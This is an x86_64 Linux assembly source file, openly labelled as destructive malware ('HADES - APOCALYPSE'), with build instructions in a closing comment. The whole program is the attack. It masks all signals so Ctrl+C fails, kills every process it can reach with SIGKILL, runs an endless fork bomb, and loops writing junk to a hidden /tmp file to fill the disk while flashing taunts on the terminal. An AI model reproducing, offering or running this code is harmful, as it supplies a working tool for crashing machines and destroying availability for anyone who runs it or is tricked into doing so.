; ==============================================================================
; PROJECT: HADES - APOCALYPSE (Pure 99-Line Assembly Edition)
; ARCHITECTURE: x86_64 Linux
; WARNING: NO LOCKS. NO PASSCODE. INSTANT SYSTEM TERMINATION.
; ==============================================================================

section .data
    ; --- TAUNTS ---
    taunt1 db 0x1B, '[1;31m [!] HADES: WHERE IS YOUR DATA? ', 0xA, 0
    taunt2 db 0x1B, '[1;33m [!] ESCAPE IS AN ILLUSION. ', 0xA, 0
    taunt3 db 0x1B, '[1;35m [!] YOUR CPU IS MINE NOW. ', 0xA, 0
    
    taunt_ptrs dq taunt1, taunt2, taunt3
    taunt_count equ 3

    ; --- PAYLOAD DATA ---
    junk_file db '/tmp/.hades_void', 0
    buffer    db 'HADES_WAS_HERE_SYSTEM_ZEROED_BY_PURE_ASSEMBLY_', 0
    buf_len   equ $ - buffer

    ; --- DELAY ---
    delay dq 0, 10000000 ; 10ms for TTY wave

section .text
    global _start

_start:
    ; --- STEP 1: SIGNAL IMMUNITY ---
    ; Mask all signals so Ctrl+C/Z don't work
    sub rsp, 8
    mov qword [rsp], 0xFFFFFFFFFFFFFFFF
    mov rax, 14         ; sys_rt_sigprocmask
    mov rdi, 0          ; SIG_BLOCK
    mov rsi, rsp
    xor rdx, rdx
    mov r10, 8
    syscall
    add rsp, 8

    ; --- STEP 2: TOTAL EVICTION ---
    ; Kill all user processes instantly
    mov rax, 62         ; sys_kill
    mov rdi, -1         ; all processes
    mov rsi, 9          ; SIGKILL
    syscall

    ; --- STEP 3: FORK SHIELD (IMMORTALITY) ---
fork_shield:
    mov rax, 57         ; sys_fork
    syscall
    test rax, rax
    jnz fork_shield      ; Parent keeps spawning children

    ; --- STEP 4: DISK I/O LOCK (RESOURCE DRAIN) ---
    ; Open a junk file to fill the disk
    mov rax, 2          ; sys_open
    mov rdi, junk_file
    mov rsi, 65         ; O_CREAT | O_WRONLY
    mov rdx, 0644o
    syscall
    mov r8, rax         ; Save FD

destruction_loop:
    ; 1. Write junk to disk
    mov rax, 1          ; sys_write
    mov rdi, r8
    mov rsi, buffer
    mov rdx, buf_len
    syscall

    ; 2. TTY HIJACK (TAUNTING)
    ; Randomly pick a taunt using rdtsc
    rdtsc
    xor rdx, rdx
    mov rcx, taunt_count
    div rcx             ; RDX = random index
    
    lea rbx, [taunt_ptrs]
    mov rsi, [rbx + rdx*8]
    mov rdx, 45         ; Roughly 45 chars
    mov rax, 1          ; sys_write
    mov rdi, 1          ; stdout
    syscall

    ; 3. DELAY (To make the chaos visible)
    mov rax, 35         ; sys_nanosleep
    mov rdi, delay
    xor rsi, rsi
    syscall

    jmp destruction_loop ; ETERNAL VOID

; ------------------------------------------------------------------------------
; TO RUN (IN VM):
; nasm -f elf64 hades.asm -o h.o && ld h.o -o hades && ./.hades
; ------------------------------------------------------------------------------
